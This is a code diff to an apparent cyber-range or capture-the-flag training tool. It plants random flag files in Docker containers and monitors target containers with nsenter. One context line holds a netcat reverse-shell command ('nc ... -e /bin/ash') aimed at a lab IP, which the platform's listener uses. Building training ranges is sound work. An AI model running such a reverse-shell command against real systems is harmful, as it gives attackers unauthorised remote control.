@@ -8,10 +8,11 @@ import stat
 import time
 import yaml
 import docker
+import pickle
+import random
+import psutil
 import shutil
 import socket
-import psutil
-import pickle
 import binascii
 import markdown
 import requests
@@ -23,6 +24,7 @@ import cProfile
 
 import networkx as nx
 import multiprocessing as mp
+from itertools import product
 import plotly.graph_objects as go
 
 from .forms import *
@@ -366,7 +368,7 @@ def environmentView(request):
                 listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"
 
             if current_scenario.listen_process_pid == 0:
-                listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "required_containers_target_1" ))
+                listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "goibhniuwe_target_1" ))
 
                 listen_process.start()
 
@@ -375,16 +377,39 @@ def environmentView(request):
             containers_objects = docker_client.containers.list()
             running_containers = [x.name for x in containers_objects]
 
-            for container in running_containers:
-                if container.__contains__("required_containers_target"):
+            shells = ["bash", "ash", "sh"]
+            locations = ["/tmp/", "~/", "/var/www/html/"]
 
-                    container_id_or_name = container
+            combinations = list(product(shells, locations))
 
-                    container_pid = subprocess.check_output(["docker", "inspect", "--format", "{{.State.Pid}}", container_id_or_name], text=True).strip()
+            flag_dict = dict()
+
+            for container in containers_objects:
+
+                container_name = container.name
+
+                random_generator = random.SystemRandom()
+
+                for combo in combinations:
+                    shell = combo[0]
+                    location = combo[1]
+                    flag = "UWE{" + f"FLAG_{format(random_generator.randint(0, 2**80 - 1), '020x')}" +"}"
+
+                    result = container.exec_run(f'{shell} -c "echo {flag} > {location}flag.txt"')
+
+                    if result.exit_code == 0:
+                        flag_dict[container_name] = flag
+                        break;
+
+                if container_name.__contains__("target"):
+
+                    container_pid = subprocess.check_output(["docker", "inspect", "--format", "{{.State.Pid}}", container_name], text=True).strip()
 
                     command = "nsenter --target {} --mount --uts --ipc --net --pid -- watch ps aux".format(container_pid)
 
                     ns_process = subprocess.run(['gnome-terminal', '--', 'bash', '-c', command], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+
+        print(flag_dict)
 
         end_time = time.time()
 
@@ -938,7 +963,7 @@ def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap
         tail_dc
     )
 
-    dc_file = "{}/Custom_Containers/required_containers/docker-compose.yml".format(resource_file_path)
+    dc_file = "{}docker-compose.yml".format(dir_path.split("GUI")[0])
 
     with open(dc_file,'w') as dcf:
         dcf.write(dc_file_content)
